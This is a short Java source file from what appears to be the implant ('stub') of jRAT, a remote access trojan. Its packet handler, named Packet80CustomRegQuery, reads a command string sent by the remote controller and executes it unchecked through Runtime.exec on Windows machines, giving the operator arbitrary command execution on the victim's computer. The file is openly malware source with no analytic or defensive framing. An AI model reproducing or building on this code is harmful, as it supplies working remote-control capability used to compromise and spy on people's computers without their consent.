package pro.jrat.stub.packets.incoming;

import pro.jrat.common.OperatingSystem;
import pro.jrat.stub.Connection;

public class Packet80CustomRegQuery extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String cmd = Connection.readLine();
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(cmd);
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
